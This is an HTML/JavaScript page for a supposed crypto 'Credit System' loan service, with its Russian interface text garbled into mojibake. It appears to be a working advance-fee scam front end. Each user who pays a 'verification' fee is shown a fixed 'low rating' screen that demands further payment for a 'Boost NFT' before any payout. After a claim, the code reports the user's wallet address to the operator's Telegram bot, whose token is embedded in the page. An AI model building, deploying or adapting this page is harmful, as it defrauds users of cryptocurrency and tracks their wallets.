<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit System</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --accent: #00f2ff; --bg: #030308; --card: #12121f; --text: #ffffff; --dim: #a0a0b8; --success: #00ff88; --error: #ff0055; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .container { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 30px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 20px; color: var(--accent); }
        .box { background: rgba(255,255,255,0.03); border: 1px solid #333; border-radius: 18px; padding: 20px; margin-bottom: 15px; text-align: left; }
        .amount { font-size: 28px; font-weight: bold; color: var(--accent); text-align: center; margin: 10px 0; }
        input[type=range] { width: 100%; accent-color: var(--accent); cursor: pointer; }
        .btn { background: var(--accent); color: #000; border: none; padding: 15px; border-radius: 14px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; margin-top: 10px; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { font-size: 12px; margin-top: 15px; color: var(--dim); }
        .reset-link { font-size: 10px; color: #444; text-decoration: none; margin-top: 20px; display: inline-block; }
    </style>
</head>
<body>

<div class="container">
    <div style="font-size: 40px; margin-bottom: 10px;">üè¶</div>
    <h1>Credit System</h1>

    <div id="app">
        <button class="btn" onclick="connect()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫</button>
    </div>

    <div id="status" class="status"></div>
    <a href="#" class="reset-link" onclick="resetAll()">–°–±—Ä–æ—Å–∏—Ç—å —Å–æ—Å—Ç–æ—è–Ω–∏–µ (–µ—Å–ª–∏ –∑–∞–±–∞–≥–∞–ª–æ—Å—å)</a>
</div>

<script>
    const TELEGRAM_TOKEN = "8514449991:AAGOD-zVo3f8-WPz0XrFXzv_iznFJMaYJi0"; 
    const TELEGRAM_CHAT_ID = "5611455025"; 
    const CONTRACT_ADDRESS = "0x6DF193f9c0a2AFDb9Dfa883f95C82Addd1613F2f"; 
    const ABI = [
        "function requestVerification() public payable",
        "function buyBoostNFT() public payable",
        "function claimCredit() public"
    ];

    let signer, address, contract;

    function resetAll() { localStorage.clear(); location.reload(); }

    async function connect() {
        if (!window.ethereum) return alert("MetaMask –Ω–µ –Ω–∞–π–¥–µ–Ω");
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        address = await signer.getAddress();
        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
        render();
    }

    function render() {
        const app = document.getElementById('app');
        
        // 1. –ï—Å–ª–∏ —É–∂–µ –∑–∞–±—Ä–∞–ª–∏ –≤—ã–ø–ª–∞—Ç—É
        if (localStorage.getItem('done_' + address)) {
            app.innerHTML = `
                <div class="box" style="border-color: var(--success)">
                    <h3 style="color: var(--success); margin: 0;">–ö–†–ï–î–ò–¢ –ê–ö–¢–ò–í–ï–ù</h3>
                    <p style="font-size: 13px;">–í—ã–ø–ª–∞—Ç–∞ –ø–æ–ª—É—á–µ–Ω–∞. –°–ª–µ–¥—É—é—â–∏–π –ª–∏–º–∏—Ç –¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ 31 –¥–µ–Ω—å –ø–æ—Å–ª–µ –ø–æ–≥–∞—à–µ–Ω–∏—è.</p>
                    <button class="btn" style="background: #222; color: #555" onclick="alert('–ü–æ–≥–∞—à–µ–Ω–∏–µ —Å—Ç–∞–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ –ø–æ–∑–∂–µ')">–ü–û–ì–ê–°–ò–¢–¨ –ö–†–ï–î–ò–¢</button>
                </div>`;
            return;
        }

        // 2. –ï—Å–ª–∏ –∫—É–ø–ª–µ–Ω NFT
        if (localStorage.getItem('nft_' + address)) {
            app.innerHTML = `
                <div class="box" style="border-color: var(--success)">
                    <h3 style="color: var(--success); margin: 0;">–õ–ò–ú–ò–¢ –û–î–û–ë–†–ï–ù</h3>
                    <p style="font-size: 13px;">NFT –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –∑–∞—á–∏—Å–ª–µ–Ω–∏—è —Å—Ä–µ–¥—Å—Ç–≤.</p>
                    <button id="claimBtn" class="btn" style="background: #00ff88" onclick="claim()">–ó–ê–ë–†–ê–¢–¨ –í–´–ü–õ–ê–¢–£</button>
                </div>`;
            return;
        }

        // 3. –ï—Å–ª–∏ –æ–ø–ª–∞—á–µ–Ω –∞–Ω–∞–ª–∏–∑
        if (localStorage.getItem('paid_' + address)) {
            app.innerHTML = `
                <div class="box" style="border-color: var(--error)">
                    <h3 style="color: var(--error); margin: 0;">–ù–ò–ó–ö–ò–ô –†–ï–ô–¢–ò–ù–ì</h3>
                    <p style="font-size: 13px;">–î–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –ª–∏–º–∏—Ç–∞ $500 —Ç—Ä–µ–±—É–µ—Ç—Å—è –∑–∞–ª–æ–≥–æ–≤—ã–π NFT Boost.</p>
                    <button class="btn" style="background: none; border: 1px solid var(--accent); color: var(--accent); margin-bottom: 10px;" onclick="buy('0.003')">–ö—É–ø–∏—Ç—å Boost (0.003 BNB)</button>
                    <button class="btn" style="background: none; border: 1px solid var(--accent); color: var(--accent);" onclick="buy('0.007')">–ö—É–ø–∏—Ç—å Pro (0.007 BNB)</button>
                </div>`;
            return;
        }

        // 4. –ù–∞—á–∞–ª–æ (–ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä)
        app.innerHTML = `
            <div class="box">
                <div style="font-size: 12px; color: var(--dim)">–°–£–ú–ú–ê: <span id="v">250</span>$</div>
                <input type="range" id="s" min="50" max="500" value="250" oninput="document.getElementById('v').innerText=this.value">
                <div class="amount" id="disp">$250</div>
                <button class="btn" onclick="start()">–ü—Ä–æ–π—Ç–∏ –ø—Ä–æ–≤–µ—Ä–∫—É</button>
                <div style="text-align: center; font-size: 10px; color: #555; margin-top: 10px;">–¶–µ–Ω–∞ –∞–Ω–∞–ª–∏–∑–∞: 0.001 BNB</div>
            </div>`;
    }

    async function start() {
        try {
            const tx = await contract.requestVerification({ value: ethers.utils.parseEther("0.001") });
            showStatus("–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –≤ —Å–µ—Ç–∏...");
            await tx.wait();
            localStorage.setItem('paid_' + address, 'true');
            render();
        } catch (e) { showStatus("–û—Ç–º–µ–Ω–∞"); }
    }

    async function buy(price) {
        try {
            const tx = await contract.buyBoostNFT({ value: ethers.utils.parseEther(price) });
            showStatus("–ü–æ–∫—É–ø–∫–∞ NFT...");
            await tx.wait();
            localStorage.setItem('nft_' + address, 'true');
            render();
        } catch (e) { showStatus("–û—à–∏–±–∫–∞ –æ–ø–ª–∞—Ç—ã"); }
    }

    async function claim() {
        const btn = document.getElementById('claimBtn');
        btn.disabled = true;
        try {
            showStatus("–ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ä–µ–¥—Å—Ç–≤...");
            const tx = await contract.claimCredit();
            await tx.wait();
            
            // –¢–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —É—Å–ø–µ—Ö–∞ —Å—Ç–∞–≤–∏–º –º–µ—Ç–∫—É
            localStorage.setItem('done_' + address, 'true');
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=üí∞ –ö—Ä–µ–¥–∏—Ç –∑–∞–±—Ä–∞–Ω: ${address}`);
            render();
        } catch (e) { 
            btn.disabled = false;
            showStatus("–û—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.");
            alert("–û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É –≤–∞—Å –µ—Å—Ç—å NFT –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.");
        }
    }

    function showStatus(t) { document.getElementById('status').innerText = t; }
</script>
</body>
</html>
